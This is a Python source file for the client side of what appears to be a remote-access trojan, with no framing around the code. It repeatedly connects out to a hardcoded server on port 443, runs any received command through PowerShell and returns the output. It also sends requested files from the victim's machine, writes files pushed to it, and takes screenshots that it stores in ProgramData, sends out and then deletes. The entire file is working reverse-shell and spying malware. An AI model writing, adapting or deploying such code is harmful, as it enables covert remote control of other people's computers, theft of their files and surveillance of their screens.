#      Client coding

import socket
import subprocess
import time
import os
#import pillow
import pyautogui
from datetime import datetime
end_result = "<end_of_result>"
server_ip = "192.168.0.195"
server_port = 443
server_address = (server_ip,server_port)
#msg_recive = client_socket.recv(1024)
#print(msg_recive.decode())
chunk_size = 2048
eof = "<end_of_file>"

while True:
    try:

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("connecting to server...")
        client_socket.connect(server_address)
        while True:

            server_command = client_socket.recv(1024)
            command = server_command.decode()
            if command.lower() == "stop":
                client_socket.close()
                break
            elif command == "":
                continue
            elif len(command) ==2 and command[0].isalpha() and command[1] == ":":
                if os.path.exists(command):
                    os.chdir(command)
                    continue
                else:
                    print(command, "is not exist")
                    continue

            elif command.startswith("cd"):
                new_path = command.strip("cd ")
                if os.path.exists(new_path):
                    os.chdir(new_path)
                    continue
                else:
                    print(new_path, "is not Exist")
                    continue

            elif command.startswith("download"):
                file_to_download = command.strip("download ")
                if os.path.exists(file_to_download) and os.path.isfile(file_to_download):
                    exists = "yes"
                    client_socket.send(exists.encode())
                    with open(file_to_download, "rb") as file:
                        chunk = file.read(chunk_size)

                        while len(chunk) > 0:
                            client_socket.send(chunk)
                            chunk = file.read(2048)
                        client_socket.send(eof.encode())
                    print("File sent successfully")

                else:
                    exists = "no"
                    print("File doesn't exist")
                    client_socket.send(exists.encode())
                    continue

            elif command.startswith("upload"):
                exists = client_socket.recv(1024)
                if exists.decode() == "yes":
                    answer = "yes"
                    client_socket.send(answer.encode())
                    file_name = command.strip("upload ")
                    with open(file_name, "wb") as download_file:
                        print("Downloading file")
                        while True:
                            chunk = client_socket.recv(chunk_size)
                            if chunk.endswith(eof.encode()):
                                chunk = chunk[:-len(eof)]
                                download_file.write(chunk)
                                break
                            download_file.write(chunk)

                    print("File Downloaded successfully")
                else:
                    print("File not exists")
                    continue

            elif command == "screenshot":
                now = datetime.now()
                now = now.strftime("%m-%d-%Y-%H.%M.%S")
                print("Take Screenshot")
                myscreen = pyautogui.screenshot()
                myscreen.save("c:\\programdata\\" + now + '.png')
                print("Screenshot Saved")
                saved_file = now + '.png'
                client_socket.send(saved_file.encode())
                os.chdir("c:\\programdata\\")
                if os.path.exists(saved_file):
                    exists = "yes"
                    client_socket.send(exists.encode())
                    answer = client_socket.recv(1024)
                    if answer.decode() == "yes":
                        with open(saved_file, "rb") as file:
                            chunk = file.read(chunk_size)
                            print("Uploading FIle ... ")
                            while len(chunk) > 0:
                                client_socket.send(chunk)
                                chunk = file.read(2048)
                                # This will run till the end of file.

                            # once the file is complete, we need to send the marker.
                            client_socket.send(eof.encode())
                        print("File sent successfully")
                        os.remove(saved_file)
                else:
                    exists = "no"
                    print("File doesn't exist")
                    client_socket.send(exists.encode())
                    continue

            else:
                output = subprocess.run(["powershell.exe", command], shell=True, capture_output=True,stdin=subprocess.DEVNULL)
                if output.stderr.decode("utf-8") == "":
                    result = output.stdout
                    result = result.decode("utf-8") + end_result
                    result = result.encode("utf-8")
                elif output.stderr.decode("utf-8") != "":
                    result = output.stderr
                    result = result.decode("utf-8") + end_result
                    result = result.encode("utf-8")

                client_socket.sendall(result)


    except Exception:
        print("can`t connect to server")
        time.sleep(5)